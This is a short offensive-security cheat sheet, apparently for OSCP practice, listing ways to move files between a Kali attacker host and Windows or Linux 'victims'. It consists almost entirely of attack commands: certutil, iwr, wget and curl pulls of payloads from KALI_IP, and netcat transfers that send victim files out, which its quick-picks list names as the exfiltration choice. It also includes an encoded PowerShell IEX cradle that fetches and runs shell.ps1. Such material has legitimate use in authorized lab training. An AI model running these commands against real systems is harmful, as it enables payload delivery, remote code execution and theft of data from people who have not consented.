File Transfer Cheatsheet (Kali ↔ Windows / Linux)

1. Kali → Windows (HTTP Method)

On Kali:

python3 -m http.server 80

On Windows:

certutil -urlcache -split -f http://KALI_IP/file.exe file.exe
iwr http://KALI_IP/file.exe -OutFile file.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://KALI_IP/file.exe','file.exe')"
2. Kali → Windows (SMB Method)

On Kali:

impacket-smbserver share . -smb2support -username kali -password kali

On Windows:

net use \\KALI_IP\share /user:kali kali
copy file.exe \\KALI_IP\share\
Or download from share: 
copy \\KALI_IP\share\file.exe file.exe
3. Windows → Kali (Netcat Method)

On Kali:

nc -lvnp 9001 > file.exe

On Windows:

nc KALI_IP 9001 < file.exe
If no nc on Windows: 
type file.exe | nc KALI_IP 9001
4. Kali → Linux (HTTP Method)

On Kali:

python3 -m http.server 80

On Linux victim:

wget http://KALI_IP/file.sh
curl http://KALI_IP/file.sh -o file.sh
5. Linux → Kali (Netcat Method)

On Kali:

nc -lvnp 9001 > file.txt

On Linux victim:

nc KALI_IP 9001 < file.txt
6. SCP (If SSH Available)

From Kali to Linux:

scp file user@TARGET_IP:/tmp/

From Linux to Kali:

scp user@TARGET_IP:/tmp/file .
7. Base64 Transfer (When Nothing Works)

On victim:

base64 file.exe
Copy output manually.

On Kali:

base64 -d file.b64 > file.exe
8. PowerShell Encoded Download
powershell -enc BASE64COMMAND
Generate encoded command: 
echo -n "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
9. FTP Quick Method

On Kali:

sudo python3 -m pyftpdlib -p 21

On victim:

ftp KALI_IP
10. OSCP Mental Quick Picks
  • Have PowerShell? → iwr
  • No PowerShell? → certutil
  • Linux? → wget
  • No tools? → base64
  • Need exfiltration? → netcat
  • SMB open? → impacket-smbserver
